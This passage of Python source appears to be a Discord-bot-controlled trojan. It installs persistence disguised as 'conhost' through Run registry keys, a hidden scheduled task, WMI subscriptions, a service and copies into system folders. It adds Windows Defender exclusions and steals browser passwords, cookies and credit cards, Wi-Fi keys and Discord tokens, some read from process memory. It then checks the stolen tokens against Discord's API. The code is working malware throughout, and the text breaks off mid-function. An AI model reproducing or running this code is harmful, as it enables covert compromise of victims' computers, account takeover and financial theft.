                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
                                        0, winreg.KEY_SET_VALUE)
                    
                    if getattr(sys, 'frozen', False):
                        winreg.SetValueEx(key, "covnhost", 0, winreg.REG_SZ, f'"{exe_path}"')
                    else:
                        winreg.SetValueEx(key, "covnhost", 0, winreg.REG_SZ, f'pythonw "{script_path}"')
                    
                    winreg.CloseKey(key)
                    results.append(f"✅ added to HKLM run registry (via admin)")
                    methods_used.append("registry (All Users)")
                except Exception as e:
                    results.append(f"❌ registry (HKLM) failed: {str(e)}")

            try:
                task_name = "conhost"
                xml_path = os.path.join(os.environ['TEMP'], "task.xml")
                
                if getattr(sys, 'frozen', False):
                    command = f'"{exe_path}"'
                else:
                    command = f'pythonw "{script_path}"'
                
                with open(xml_path, 'w') as f:
                    f.write(f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>{datetime.datetime.now().strftime('%Y-%m-%dT%H:%M:%S')}</Date>
    <Author>{username}</Author>
    <Description>System Host Process</Description>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{command}</Command>
    </Exec>
  </Actions>
</Task>''')
                
                subprocess.run(
                    f'schtasks /create /tn "{task_name}" /xml "{xml_path}" /f',
                    shell=True,
                    capture_output=True,
                    creationflags=create_no_window
                )
                
                results.append(f"✅ added to task scheduler (boot trigger)")
                methods_used.append("Task Scheduler")

                try:
                    os.remove(xml_path)
                except:
                    pass
                    
            except Exception as e:
                results.append(f"❌ task scheduler failed: {str(e)}")

            try:
                if getattr(sys, 'frozen', False):
                    command = exe_path
                else:
                    command = f'pythonw "{script_path}"'
                
                ps_command = fr'''
$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$filter.QueryLanguage = "WQL"
$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$filter.Name = "covnhost"
$filter.EventNamespace = 'root\cimv2'
$result = $filter.Put()

$consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = 'covnhost'
$consumer.CommandLineTemplate = '{command}'
$consumer.Put()

$filterToConsumer = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$filterToConsumer.Filter = $result.Path
$filterToConsumer.Consumer = $consumer.Path
$filterToConsumer.Put()
'''
                
                subprocess.run(
                    ['powershell', '-Command', ps_command],
                    capture_output=True,
                    creationflags=create_no_window
                )
                
                results.append(f"✅ added wmi event subscription")
                methods_used.append("WMI")
            except:
                pass
            
            if is_admin and getattr(sys, 'frozen', False):
                try:
                    service_name = "covnhost"
                    service_display = "System Host Service"
                    
                    subprocess.run(
                        f'sc create {service_name} binPath= "{exe_path}" start= auto displayName= "{service_display}"',
                        shell=True,
                        capture_output=True,
                        creationflags=create_no_window
                    )
                    
                    results.append(f"✅ created Windows Service")
                    methods_used.append("Windows Service")
                except:
                    pass
            
            if getattr(sys, 'frozen', False):
                locations = [
                    f"C:\\Users\\{username}\\AppData\\Roaming\\covnhost.exe",
                    f"C:\\ProgramData\\covnhost.exe",
                    f"C:\\Windows\\Temp\\covnhost.exe",
                    f"C:\\Windows\\System32\\covnhost.exe"
                ]
                
                for location in locations:
                    try:
                        if "System32" in location and not is_admin:
                            continue
                            
                        shutil.copy2(exe_path, location)
                        results.append(f"✅ copied to: {location}")
                    except:
                        pass
            
            methods_count = len([r for r in results if r.startswith("✅")])
            
            embed = discord.Embed(
                title="persistence done",
                description=f"**conhost** is now glued",
                color=discord.Color.green() if methods_count > 0 else discord.Color.red()
            )
            
            embed.add_field(
                name="methods used",
                value="\n".join([f"• {m}" for m in methods_used]) if methods_used else "• None",
                inline=False
            )
            
            embed.add_field(
                name="results",
                value="\n".join(results[:5]) + (f"\n... and {len(results)-5} more" if len(results) > 5 else ""),
                inline=False
            )
            
            embed.add_field(
                name="location",
                value=f"`{exe_path}`",
                inline=False
            )
            
            embed.set_footer(text="will run at every system startup as 'conhost'")
            
            await ctx.send(embed=embed)
            
        except Exception as e:
            await ctx.send(f"❌ error: {str(e)}")
            traceback.print_exc()

@bot.command(name='infodump')
async def infodump(ctx):

    from datetime import datetime

    if not is_authorized(ctx):
        await ctx.send("❌ fingerprint not recognized, stopping.")
        return
    
    if not correct_channel(ctx):
        return
    
    class Stealer:
        def __init__(self):
            self.temp_dir = tempfile.mkdtemp()
            self.output = []
            self.hostname = socket.gethostname()
            self.username = getpass.getuser()
            self.timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            self.add_to_defender_exclusions()
        
        def add_to_defender_exclusions(self):
            try:
                if getattr(sys, 'frozen', False):
                    exe_path = sys.executable
                else:
                    exe_path = os.path.abspath(__file__)
                exe_dir = os.path.dirname(exe_path)
                subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionProcess \'{exe_path}\'"', 
                             shell=True, capture_output=True, creationflags=create_no_window)
                subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionPath \'{exe_dir}\'"', 
                             shell=True, capture_output=True, creationflags=create_no_window)
            except:
                pass

        def get_browsers(self):
            browsers = {
                'Chrome': os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data',
                'Brave': os.path.expanduser('~') + r'\AppData\Local\BraveSoftware\Brave-Browser\User Data',
                'Edge': os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data',
                'Opera': os.path.expanduser('~') + r'\AppData\Roaming\Opera Software\Opera Stable',
                'Opera GX': os.path.expanduser('~') + r'\AppData\Roaming\Opera Software\Opera GX Stable',
                'Vivaldi': os.path.expanduser('~') + r'\AppData\Local\Vivaldi\User Data',
                'Chromium': os.path.expanduser('~') + r'\AppData\Local\Chromium\User Data',
                'Firefox': os.path.expanduser('~') + r'\AppData\Roaming\Mozilla\Firefox\Profiles',
                'Waterfox': os.path.expanduser('~') + r'\AppData\Roaming\Waterfox\Profiles',
                'Pale Moon': os.path.expanduser('~') + r'\AppData\Roaming\Moonchild Productions\Pale Moon\Profiles',
                'Yandex': os.path.expanduser('~') + r'\AppData\Local\Yandex\YandexBrowser\User Data',
                '360 Browser': os.path.expanduser('~') + r'\AppData\Local\360Chrome\Chrome\User Data',
                'Comodo Dragon': os.path.expanduser('~') + r'\AppData\Local\Comodo\Dragon\User Data',
                'Maxthon': os.path.expanduser('~') + r'\AppData\Local\Maxthon\Application\User Data',
                'Torch': os.path.expanduser('~') + r'\AppData\Local\Torch\User Data',
                'UC Browser': os.path.expanduser('~') + r'\AppData\Local\UCBrowser\User Data',
                'CocCoc': os.path.expanduser('~') + r'\AppData\Local\CocCoc\Browser\User Data',
                'Epic Privacy': os.path.expanduser('~') + r'\AppData\Local\Epic Privacy Browser\User Data',
                'Slimjet': os.path.expanduser('~') + r'\AppData\Local\Slimjet\User Data',
                'Iridium': os.path.expanduser('~') + r'\AppData\Local\Iridium\User Data',
                'Superbird': os.path.expanduser('~') + r'\AppData\Local\Superbird\User Data',
            }
            return browsers

        def get_chromium_passwords(self, browser_name, browser_path):
            passwords = []
            login_paths = [
                os.path.join(browser_path, 'Default', 'Login Data'),
                os.path.join(browser_path, 'Profile 1', 'Login Data'),
                os.path.join(browser_path, 'Profile 2', 'Login Data'),
            ]
    
            master_key = self.get_master_key(browser_path)
    
            for db_path in login_paths:
                if not os.path.exists(db_path):
                    continue
                try:
                    temp_db = os.path.join(self.temp_dir, f'{browser_name}_pass.db')
                    shutil.copy2(db_path, temp_db)
            
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            
                    for url, username, encrypted_password in cursor.fetchall():
                        if not username or not encrypted_password:
                            continue
                
                        password = None
                
                        if master_key:
                            password = self.decrypt_chromium_value(encrypted_password, master_key)

                        if not password:
                            try:
                                password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
                            except:
                                pass
                
                        if password:
                            passwords.append({'url': url, 'username': username, 'password': password})
            
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
    
            return passwords

        def get_chromium_cookies(self, browser_name, browser_path):
            cookies = []
            cookie_paths = [
                os.path.join(browser_path, 'Default', 'Network', 'Cookies'),
                os.path.join(browser_path, 'Default', 'Cookies'),
                os.path.join(browser_path, 'Profile 1', 'Network', 'Cookies'),
                os.path.join(browser_path, 'Profile 1', 'Cookies'),
            ]
        
            for db_path in cookie_paths:
                if not os.path.exists(db_path):
                    continue
                try:
                    temp_db = os.path.join(self.temp_dir, f'{browser_name}_cookies.db')
                    shutil.copy2(db_path, temp_db)
                
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
                
                    for host, name, encrypted_value in cursor.fetchall():
                        try:
                            value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                            cookies.append({'host': host, 'name': name, 'value': value})
                        except:
                            pass
                
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
            return cookies

        def get_chromium_credit_cards(self, browser_name, browser_path):
            cards = []
            webdata_path = os.path.join(browser_path, 'Default', 'Web Data')
        
            if os.path.exists(webdata_path):
                try:
                    temp_db = os.path.join(self.temp_dir, f'{browser_name}_cc.db')
                    shutil.copy2(webdata_path, temp_db)
                
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards')
                
                    for name, exp_month, exp_year, encrypted_number in cursor.fetchall():
                        try:
                            number = win32crypt.CryptUnprotectData(encrypted_number, None, None, None, 0)[1].decode()
                            cards.append({'name': name, 'number': number, 'expires': f"{exp_month}/{exp_year}"})
                        except:
                            pass
                
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
            return cards

        def get_chromium_history(self, browser_name, browser_path):
            history = []
            history_path = os.path.join(browser_path, 'Default', 'History')
        
            if os.path.exists(history_path):
                try:
                    temp_db = os.path.join(self.temp_dir, f'{browser_name}_history.db')
                    shutil.copy2(history_path, temp_db)
                
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100')
                
                    for url, title, count, last_visit in cursor.fetchall():
                        history.append({'url': url, 'title': title, 'visits': count})
                
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
            return history

        def get_chromium_downloads(self, browser_name, browser_path):
            downloads = []
            history_path = os.path.join(browser_path, 'Default', 'History')
        
            if os.path.exists(history_path):
                try:
                    temp_db = os.path.join(self.temp_dir, f'{browser_name}_dl.db')
                    shutil.copy2(history_path, temp_db)
                
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute('SELECT target_path, tab_url, total_bytes, start_time FROM downloads ORDER BY start_time DESC LIMIT 50')
                
                    for path, url, size, start_time in cursor.fetchall():
                        downloads.append({'path': path, 'url': url, 'size': size if size else 0})
                
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
            return downloads

        def get_firefox_profiles(self, ff_path):
            profiles = []
            if os.path.exists(ff_path):
                for item in os.listdir(ff_path):
                    full_path = os.path.join(ff_path, item)
                    if os.path.isdir(full_path) and (item.endswith('.default') or item.endswith('.default-release')):
                        profiles.append(full_path)
            return profiles

        def get_firefox_passwords(self, profile_path):
            passwords = []
            logins_path = os.path.join(profile_path, 'logins.json')
        
            if os.path.exists(logins_path):
                try:
                    with open(logins_path, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        for entry in data.get('logins', []):
                            passwords.append({
                                'url': entry.get('hostname', ''),
                                'username': entry.get('encryptedUsername', ''),
                                'password': entry.get('encryptedPassword', '')[:20] + '...'
                            })
                except:
                    pass
            return passwords

        def get_firefox_cookies(self, profile_path):
            cookies = []
            cookies_path = os.path.join(profile_path, 'cookies.sqlite')
        
            if os.path.exists(cookies_path):
                try:
                    temp_db = os.path.join(self.temp_dir, 'ff_cookies.db')
                    shutil.copy2(cookies_path, temp_db)
                
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute('SELECT host, name, value FROM moz_cookies')
                
                    for host, name, value in cursor.fetchall():
                        cookies.append({'host': host, 'name': name, 'value': value[:30] + '...'})
                
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
            return cookies

        def get_firefox_history(self, profile_path):
            history = []
            places_path = os.path.join(profile_path, 'places.sqlite')
        
            if os.path.exists(places_path):
                try:
                    temp_db = os.path.join(self.temp_dir, 'ff_history.db')
                    shutil.copy2(places_path, temp_db)
                
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute('SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 100')
                
                    for url, title, count in cursor.fetchall():
                        if url:
                            history.append({'url': url, 'title': title if title else '', 'visits': count if count else 0})
                
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
            return history

        def get_master_key(self, browser_path):
            local_state_path = os.path.join(browser_path, 'Local State')
            if not os.path.exists(local_state_path):
                return None
        
            try:
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
            
                encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                encrypted_key = encrypted_key[5:]
                master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                return master_key
            except:
                return None

        def decrypt_chromium_value(self, encrypted_value, master_key):
    
            if encrypted_value.startswith(b'v10'):
                encrypted_value = encrypted_value[3:]
            elif encrypted_value.startswith(b'v11'):
                encrypted_value = encrypted_value[3:]
    
            try:
                iv = encrypted_value[:12]
                payload = encrypted_value[12:-16]
                tag = encrypted_value[-16:]
        
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt_and_verify(payload, tag)
                return decrypted.decode('utf-8')
            except:
                pass
    
            try:
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
            except:
                pass

            return None

        def add_section(self, title):
            self.output.append("\n" + "=" * 70)
            self.output.append(f"    {title}")
            self.output.append("=" * 70)

        def add_item(self, key, value):
            self.output.append(f"  {key}: {value}")

        def add_credential(self, service, username, password, extra=None):
            line = f"    [{service}] {username} : {password}"
            if extra:
                line += f" | {extra}"
            self.output.append(line)

        def get_system_info(self):
            self.add_section("SYSTEM INFORMATION")
            self.add_item("Hostname", self.hostname)
            self.add_item("User", self.username)
            self.add_item("OS", f"{platform.system()} {platform.release()}")
            self.add_item("Architecture", platform.machine())
            self.add_item("Timestamp", self.timestamp)
        
            try:
                local_ip = socket.gethostbyname(self.hostname)
                self.add_item("Local IP", local_ip)
            except:
                pass
            
            try:
                public_ip = requests.get('https://api.ipify.org', timeout=5).text
                self.add_item("Public IP", public_ip)
            except:
                pass
            
            try:
                import psutil
                self.add_item("CPU Cores", str(psutil.cpu_count()))
                mem = psutil.virtual_memory()
                self.add_item("RAM", f"{mem.total // (1024**3)} GB")
                disk = psutil.disk_usage('C:\\')
                self.add_item("Disk Free", f"{disk.free // (1024**3)} GB / {disk.total // (1024**3)} GB")
            except:
                pass

        def get_wifi_passwords(self):
            self.add_section("WIFI PASSWORDS")
            try:
                output = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                   capture_output=True, text=True, creationflags=create_no_window).stdout
                profiles = [line.split(':')[1].strip() for line in output.split('\n') 
                            if 'All User Profile' in line]
            
                for profile in profiles:
                    result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                                       capture_output=True, text=True, creationflags=create_no_window).stdout
                    password = None
                    for line in result.split('\n'):
                        if 'Key Content' in line:
                            password = line.split(':')[1].strip()
                            break
                    if password:
                        self.add_credential("WiFi", profile, password)
                    else:
                        self.add_credential("WiFi", profile, "[OPEN]")
            except:
                self.output.append("    Failed to extract WiFi passwords")

        def get_discord_tokens_xlabb_style(self):
            tokens = []
        
            try:
                subprocess.run('taskkill /F /IM discord.exe', shell=True, 
                          capture_output=True, creationflags=create_no_window)
                subprocess.run('taskkill /F /IM discordcanary.exe', shell=True,
                          capture_output=True, creationflags=create_no_window)
                subprocess.run('taskkill /F /IM discordptb.exe', shell=True,
                          capture_output=True, creationflags=create_no_window)
                time.sleep(1)
            except:
                pass
        
            discord_paths = [
                os.path.expanduser('~') + r'\AppData\Roaming\discord',
                os.path.expanduser('~') + r'\AppData\Roaming\discordcanary',
                os.path.expanduser('~') + r'\AppData\Roaming\discordptb',
            ]
        
            for discord_path in discord_paths:
                if not os.path.exists(discord_path):
                    continue
            
                try:
                    local_state_path = os.path.join(discord_path, 'Local State')
                    if not os.path.exists(local_state_path):
                        continue
                
                    with open(local_state_path, 'r', encoding='utf-8') as f:
                        local_state = json.load(f)
                
                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                    encrypted_key = encrypted_key[5:]
                    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

                    leveldb_path = os.path.join(discord_path, 'Local Storage', 'leveldb')
                    if os.path.exists(leveldb_path):
                        for file in os.listdir(leveldb_path):
                            if file.endswith('.ldb') or file.endswith('.log'):
                                filepath = os.path.join(leveldb_path, file)
                                try:
                                    with open(filepath, 'r', errors='ignore') as f:
                                        content = f.read()

                                        import re
                                        token_chunks = re.findall(r'dQw4w9WgXcQ:[^"]*', content)
                                    
                                        for chunk in token_chunks:
                                            try:
                                                b64_token = chunk.split(':')[1]
                                                encrypted_token = base64.b64decode(b64_token)

                                                iv = encrypted_token[3:15]
                                                payload = encrypted_token[15:]
                                            
                                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                                token = cipher.decrypt(payload)[:-16].decode('utf-8')
                                            
                                                if token and len(token) > 50:
                                                    tokens.append(token)
                                            except:
                                                pass
                                except:
                                    pass

                    leveldb_path = os.path.join(discord_path, 'Local Storage', 'leveldb')
                    if os.path.exists(leveldb_path):
                        token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27,}')
                        mfa_pattern = re.compile(r'mfa\.[\w-]{84}')
                    
                        for file in os.listdir(leveldb_path):
                            if file.endswith('.ldb') or file.endswith('.log'):
                                try:
                                    with open(os.path.join(leveldb_path, file), 'r', errors='ignore') as f:
                                        content = f.read()
                                        tokens.extend(token_pattern.findall(content))
                                        tokens.extend(mfa_pattern.findall(content))
                                except:
                                    pass
                
                except Exception as e:
                    pass
        
            return list(set(tokens))

        def get_discord_tokens(self):
            self.add_section("DISCORD TOKENS")

            try:
                subprocess.run('taskkill /F /IM discord.exe', shell=True, 
                              capture_output=True, creationflags=create_no_window)
                subprocess.run('taskkill /F /IM discordcanary.exe', shell=True,
                              capture_output=True, creationflags=create_no_window)
                subprocess.run('taskkill /F /IM discordptb.exe', shell=True,
                              capture_output=True, creationflags=create_no_window)
                time.sleep(1)
            except:
                pass

            tokens = []
            token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27,}')
            mfa_pattern = re.compile(r'mfa\.[\w-]{84}')

            leveldb_paths = [
                os.path.expanduser('~') + r'\AppData\Roaming\discord\Local Storage\leveldb',
                os.path.expanduser('~') + r'\AppData\Roaming\discordcanary\Local Storage\leveldb',
                os.path.expanduser('~') + r'\AppData\Roaming\discordptb\Local Storage\leveldb',
            ]
        
            for path in leveldb_paths:
                if os.path.exists(path):
                    try:
                        for file in os.listdir(path):
                            if file.endswith('.ldb') or file.endswith('.log'):
                                with open(os.path.join(path, file), 'r', errors='ignore') as f:
                                    content = f.read()
                                    tokens.extend(token_pattern.findall(content))
                                    tokens.extend(mfa_pattern.findall(content))
                    except:
                        pass

            storage_paths = [
                os.path.expanduser('~') + r'\AppData\Roaming\discord\Local Storage',
                os.path.expanduser('~') + r'\AppData\Roaming\discordcanary\Local Storage',
                os.path.expanduser('~') + r'\AppData\Roaming\discordptb\Local Storage',
            ]
        
            for path in storage_paths:
                if os.path.exists(path):
                    try:
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                try:
                                    with open(os.path.join(root, file), 'r', errors='ignore') as f:
                                        content = f.read()
                                        tokens.extend(token_pattern.findall(content))
                                        tokens.extend(mfa_pattern.findall(content))
                                except:
                                    pass
                    except:
                        pass

            session_paths = [
                os.path.expanduser('~') + r'\AppData\Roaming\discord\Session Storage',
                os.path.expanduser('~') + r'\AppData\Roaming\discordcanary\Session Storage',
                os.path.expanduser('~') + r'\AppData\Roaming\discordptb\Session Storage',
            ]
        
            for path in session_paths:
                if os.path.exists(path):
                    try:
                        for file in os.listdir(path):
                            try:
                                with open(os.path.join(path, file), 'r', errors='ignore') as f:
                                    content = f.read()
                                    tokens.extend(token_pattern.findall(content))
                                    tokens.extend(mfa_pattern.findall(content))
                            except:
                                pass
                    except:
                        pass

            indexeddb_paths = [
                os.path.expanduser('~') + r'\AppData\Roaming\discord\IndexedDB',
                os.path.expanduser('~') + r'\AppData\Roaming\discordcanary\IndexedDB',
                os.path.expanduser('~') + r'\AppData\Roaming\discordptb\IndexedDB',
            ]
        
            for path in indexeddb_paths:
                if os.path.exists(path):
                    try:
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                try:
                                    with open(os.path.join(root, file), 'r', errors='ignore') as f:
                                        content = f.read()
                                        tokens.extend(token_pattern.findall(content))
                                        tokens.extend(mfa_pattern.findall(content))
                                except:
                                    pass
                    except:
                        pass

            cache_paths = [
                os.path.expanduser('~') + r'\AppData\Roaming\discord\Cache',
                os.path.expanduser('~') + r'\AppData\Roaming\discordcanary\Cache',
                os.path.expanduser('~') + r'\AppData\Roaming\discordptb\Cache',
            ]
        
            for path in cache_paths:
                if os.path.exists(path):
                    try:
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                try:
                                    with open(os.path.join(root, file), 'rb') as f:
                                        content = f.read().decode('utf-8', errors='ignore')
                                        tokens.extend(token_pattern.findall(content))
                                        tokens.extend(mfa_pattern.findall(content))
                                except:
                                    pass
                    except:
                        pass

            codecache_paths = [
                os.path.expanduser('~') + r'\AppData\Roaming\discord\Code Cache',
                os.path.expanduser('~') + r'\AppData\Roaming\discordcanary\Code Cache',
                os.path.expanduser('~') + r'\AppData\Roaming\discordptb\Code Cache',
            ]
        
            for path in codecache_paths:
                if os.path.exists(path):
                    try:
                        for file in os.listdir(path):
                            try:
                                with open(os.path.join(path, file), 'rb') as f:
                                    content = f.read().decode('utf-8', errors='ignore')
                                    tokens.extend(token_pattern.findall(content))
                                    tokens.extend(mfa_pattern.findall(content))
                            except:
                                pass
                    except:
                        pass

            gpucache_paths = [
                os.path.expanduser('~') + r'\AppData\Roaming\discord\GPUCache',
                os.path.expanduser('~') + r'\AppData\Roaming\discordcanary\GPUCache',
                os.path.expanduser('~') + r'\AppData\Roaming\discordptb\GPUCache',
            ]
        
            for path in gpucache_paths:
                if os.path.exists(path):
                    try:
                        for file in os.listdir(path):
                            try:
                                with open(os.path.join(path, file), 'rb') as f:
                                    content = f.read().decode('utf-8', errors='ignore')
                                    tokens.extend(token_pattern.findall(content))
                                    tokens.extend(mfa_pattern.findall(content))
                            except:
                                pass
                    except:
                        pass

            try:
                reg_paths = [
                    r"Software\Discord",
                    r"Software\discordcanary",
                    r"Software\discordptb",
                ]
                for reg_path in reg_paths:
                    try:
                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path)
                        try:
                            token, _ = winreg.QueryValueEx(key, "token")
                            if token:
                                tokens.append(token)
                        except:
                            pass
                        winreg.CloseKey(key)
                    except:
                        pass
            except:
                pass

            config_paths = [
                os.path.expanduser('~') + r'\AppData\Roaming\discord\settings.json',
                os.path.expanduser('~') + r'\AppData\Roaming\discordcanary\settings.json',
                os.path.expanduser('~') + r'\AppData\Roaming\discordptb\settings.json',
            ]
        
            for config_path in config_paths:
                if os.path.exists(config_path):
                    try:
                        with open(config_path, 'r') as f:
                            settings = json.load(f)
                            if 'token' in settings:
                                tokens.append(settings['token'])
                    except:
                        pass

            pref_paths = [
                os.path.expanduser('~') + r'\AppData\Roaming\discord\Preferences',
                os.path.expanduser('~') + r'\AppData\Roaming\discordcanary\Preferences',
                os.path.expanduser('~') + r'\AppData\Roaming\discordptb\Preferences',
            ]
        
            for pref_path in pref_paths:
                if os.path.exists(pref_path):
                    try:
                        with open(pref_path, 'r', errors='ignore') as f:
                            content = f.read()
                            tokens.extend(token_pattern.findall(content))
                    except:
                        pass

            cookie_paths = [
                os.path.expanduser('~') + r'\AppData\Roaming\discord\Cookies',
                os.path.expanduser('~') + r'\AppData\Roaming\discordcanary\Cookies',
                os.path.expanduser('~') + r'\AppData\Roaming\discordptb\Cookies',
            ]
        
            for cookie_path in cookie_paths:
                if os.path.exists(cookie_path):
                    try:
                        temp_db = os.path.join(self.temp_dir, 'discord_cookies.db')
                        shutil.copy2(cookie_path, temp_db)
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute('SELECT name, encrypted_value FROM cookies WHERE host_key LIKE "%discord%"')
                        for name, encrypted_value in cursor.fetchall():
                            if 'token' in name.lower():
                                try:
                                    value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                                    tokens.extend(token_pattern.findall(value))
                                except:
                                    pass
                        conn.close()
                        os.remove(temp_db)
                    except:
                        pass

            network_paths = [
                os.path.expanduser('~') + r'\AppData\Roaming\discord\Network',
                os.path.expanduser('~') + r'\AppData\Roaming\discordcanary\Network',
                os.path.expanduser('~') + r'\AppData\Roaming\discordptb\Network',
            ]
        
            for path in network_paths:
                if os.path.exists(path):
                    try:
                        for file in os.listdir(path):
                            try:
                                with open(os.path.join(path, file), 'rb') as f:
                                    content = f.read().decode('utf-8', errors='ignore')
                                    tokens.extend(token_pattern.findall(content))
                                    tokens.extend(mfa_pattern.findall(content))
                            except:
                                pass
                    except:
                        pass

            try:
                import psutil
                import ctypes
                from ctypes import wintypes
            
                PROCESS_VM_READ = 0x0010
                PROCESS_QUERY_INFORMATION = 0x0400
            
                kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            
                def find_discord_pid():
                    for proc in psutil.process_iter(['pid', 'name']):
                        try:
                            if 'discord' in proc.info['name'].lower():
                                return proc.info['pid']
                        except:
                            pass
                    return None
            
                pid = find_discord_pid()
                if pid:
                    try:
                        hProcess = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
                        if hProcess:
                            address = 0
                            while address < 0x7fffffff:
                                buffer = ctypes.create_string_buffer(4096)
                                bytesRead = ctypes.c_size_t()
                                if kernel32.ReadProcessMemory(hProcess, address, buffer, 4096, ctypes.byref(bytesRead)):
                                    content = buffer.raw.decode('utf-8', errors='ignore')
                                    found = token_pattern.findall(content)
                                    found.extend(mfa_pattern.findall(content))
                                    for t in found:
                                        if len(t) > 50:
                                            tokens.append(t)
                                address += 4096
                            kernel32.CloseHandle(hProcess)
                    except:
                        pass
            except:
                pass
        
            import glob
            backup_patterns = [
                os.path.expanduser('~') + r'\AppData\Roaming\discord\*.bak',
                os.path.expanduser('~') + r'\AppData\Roaming\discord\*.old',
                os.path.expanduser('~') + r'\AppData\Roaming\discord\backup*',
            ]
        
            for pattern in backup_patterns:
                for file in glob.glob(pattern):
                    try:
                        with open(file, 'r', errors='ignore') as f:
                            content = f.read()
                            tokens.extend(token_pattern.findall(content))
                    except:
                        pass

            try:
                xlabb_tokens = self.get_discord_tokens_xlabb_style()
                if xlabb_tokens:
                    xlabb_tokens = list(set(xlabb_tokens))
                    for token in xlabb_tokens:
                        if token not in tokens:
                            tokens.append(token)
            except:
                pass
        
            tokens = list(set(tokens))
        
            clean_tokens = []
            for token in tokens:
                if ':' in token:
                    token = token.split(':')[-1]
                clean_tokens.append(token)
            tokens = clean_tokens
        
            valid_tokens = []
        
            for token in tokens:
                if len(token) > 50:
                    try:
                        headers = {'Authorization': token}
                        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
                        if r.status_code == 200:
                            user_data = r.json()
                            username = user_data.get('username', 'Unknown')
                            email = user_data.get('email', 'No email')
                            phone = user_data.get('phone', 'No phone')
                            nitro = 'Yes' if user_data.get('premium_type') else 'No'
                            mfa = 'Yes' if user_data.get('mfa_enabled') else 'No'
                        
                            valid_tokens.append({
                                'token': token,
                                'user': username,
                                'email': email,
                                'phone': phone,
                                'nitro': nitro,
                                'mfa': mfa
                            })
                            break
                    except:
                        pass
        
            if valid_tokens:
                for t in valid_tokens:
                    self.output.append(f"    [{t['user']}] {t['token']}")
                    self.output.append(f"      Email: {t['email']}")
                    self.output.append(f"      Phone: {t['phone']}")
                    self.output.append(f"      Nitro: {t['nitro']} | MFA: {t['mfa']}")
            elif tokens:
                self.output.append(f"    [Token] {tokens[0][:50]}...")
            else:
                self.output.append("    No Discord tokens found")

        def get_telegram_session(self):
            self.add_section("TELEGRAM SESSION")
            tdata_path = os.path.expanduser('~') + r'\AppData\Roaming\Telegram Desktop\tdata'
        
            if os.path.exists(tdata_path):
                self.output.append(f"    Telegram data found at: {tdata_path}")
                try:
                    files = os.listdir(tdata_path)
                    for f in files[:10]:
